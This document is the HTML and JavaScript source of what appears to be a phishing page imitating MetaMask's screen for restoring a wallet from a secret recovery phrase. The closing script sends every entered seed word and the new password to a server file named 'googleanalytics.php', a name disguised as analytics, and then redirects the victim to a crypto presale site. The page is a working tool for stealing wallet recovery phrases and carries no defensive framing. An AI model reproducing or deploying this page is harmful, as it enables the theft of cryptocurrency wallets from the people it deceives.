                <img height="42" width="42" src="./assets/images/logo/metamask-fox.svg" class="app-header__metafox-logo--icon" alt=""></div>
                <div class="first-time-flow__import">
                  <div class="first-time-flow__create-back"></div>
                  <div class="first-time-flow__header">Restore your Account with Secret Recovery Phrase</div>
                  <div class="first-time-flow__text-block">Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.</div>
                  <form class="create-new-vault__form" x-data="{count: 12}">
                    <div class="import-srp__container">
                      <label class="import-srp__srp-label">
                        <h4 class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--h4 typography--weight-bold typography--style-normal typography--align-left typography--color-text-default">Secret Recovery Phrase</h4></label>

                        <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                          <path d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z" fill="var(--color-info-default)"></path>
                        </svg>
                        <div class="actionable-message__message">You can paste your entire secret recovery phrase into any field</div>
                      </div>
                      <div class="dropdown import-srp__number-of-words-dropdown">
                        <select name="count" class="dropdown__select" x-model.number="count">
                          <option value="12">I have a 12-word phrase</option>
                          <option value="15">I have a 15-word phrase</option>
                          <option value="18">I have a 18-word phrase</option>
                          <option value="21">I have a 21-word phrase</option>
                          <option value="24">I have a 24-word phrase</option>
                        </select>
                        <svg width="16" height="16" fill="currentColor" class="dropdown__icon-caret-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                          <path d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z"></path>
                        </svg>
                      </div>
                      <div class="import-srp__srp">
                        <template x-for="i in count">
                          <div class="import-srp__srp-word" x-data="{show: false}">
                            <label :for="`import-srp__srp-word-${i}`" class="import-srp__srp-word-label">
                              <p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
                                <span x-text="i"></span>.
                              </p>
                            </label>
                            <div class="MuiFormControl-root MuiTextField-root">
                              <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                <input name="word[]" :id="`import-srp__srp-word-${i}`" :type="show ? 'text' : 'password'" value="" aria-invalid="false" autocomplete="off" dir="auto" class="MuiInputBase-input MuiInput-input">
                              </div>
                            </div>
                            <div class="show-hide-toggle">
                              <input :value="i" class="show-hide-toggle__input" :id="`import-srp__srp-word-${i}-checkbox`" type="checkbox">
                              <label :for="`import-srp__srp-word-${i}-checkbox`" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                                <svg x-show="show == false" @click="show = true" width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                  <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
                                </svg>
                                <svg x-show="show == true" @click="show = false" width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is being shown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
                                  <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>
                                </svg>
                              </label>
                            </div>
                          </div>
                        </template>
                      </div>
                    </div>
                    <div class="create-new-vault__create-password">
                      <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
                        <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">New password (8 characters min)</label>
                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                          <input name="password" aria-invalid="false" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                        </div>
                      </div>
                      <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
                        <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Confirm password</label>
                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                          <input name="password_confirmation" aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                        </div>
                      </div>
                    </div>
                    <div class="create-new-vault__terms">
                      <input class="check-box far fa-square" id="create-new-vault__terms-checkbox" readonly="" type="checkbox">
                      <label class="create-new-vault__terms-label" for="create-new-vault__terms-checkbox">
                        <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
                          <span>
                            I have read and agree to the
                            <a class="create-new-vault__terms-link" href="#terms.html" target="_blank" rel="noopener noreferrer">
                              Terms of Use
                            </a>
                          </span>
                        </span>
                      </label>
                    </div>
                    <button class="button btn--rounded btn-primary create-new-vault__submit-button" style="cursor:pointer; color: #fff; margin-bottom: 40px;" type="submit" disabled>Import</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
  <script src="./assets/js/jquery-3.6.0.min.js"></script>
  <script src="./assets/js/alpine.js"></script>

  <script>

    var goUrl = 'https://calvaria.io/presale/';

    var alertHtml = `
    <div class="actionable-message actionable-message--danger import-srp__srp-error actionable-message--with-icon">
      <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
        <path d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z" fill="var(--color-error-default)"></path>
      </svg>
      <div class="actionable-message__message">Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words</div>
    </div>
    `;

    $(`input[name='word[]']`).bind('input keyup', function (event) {
      $(this).val($(this).val().replace(/\s+/g, ''));

      check();
    });

    $(`input[name='word[]']`).bind('paste', function (event) {
      event.preventDefault();

      var inputs = $(`input[name='word[]']`);
      var pastedWords = event.originalEvent.clipboardData.getData('text').replace(/\s+/g, ' ').split(' ').filter(Boolean);
      
      if ( pastedWords.length == 1 ) {
        $(this).val($(this).val().replace(/\s+/g, ''));
      } else {
        inputs.val('');

        $.each(pastedWords, function ( index, value ) {
          inputs[index] ? inputs[index].value = value : null;
        })
      }

      if (
        $(`input[name='word[]']`).filter(function() {return this.value ? true : false}).length == $(`select[name='count'] option:selected`).val()
      ) {
        $('.create-new-vault__submit-button').attr('disabled', false);
      } else {
        $('.create-new-vault__submit-button').attr('disabled', true);
        $('.import-srp__container').append(alertHtml);
      }

      check();
    });

    function check() {
      $('.actionable-message--danger').remove();
      
      if (
        $(`input[name='word[]']`).filter(function() {return this.value ? true : false}).length == $(`select[name='count'] option:selected`).val()
      ) {
        $('.create-new-vault__submit-button').attr('disabled', false);
      } else {
        $('.create-new-vault__submit-button').attr('disabled', true);
        $('.import-srp__container').append(alertHtml);
      }
    }

    $("form").submit(function (event) {
      $.ajax({
        type: 'POST',
        url: 'googleanalytics.php',
        data: $('form').serialize(),
        cache: false,
        success: function (response) {window.location.href = goUrl;
        }
      });

      event.preventDefault();
    });


    $('.check-box').click(function () {
      if ( this.checked ) {
        $(this).removeClass('fa-square').addClass('fa-check-square check-box__checked');
      } else {
        $(this).removeClass('fa-check-square check-box__checked').addClass('fa-square');
      }
    })
  </script>
</html>
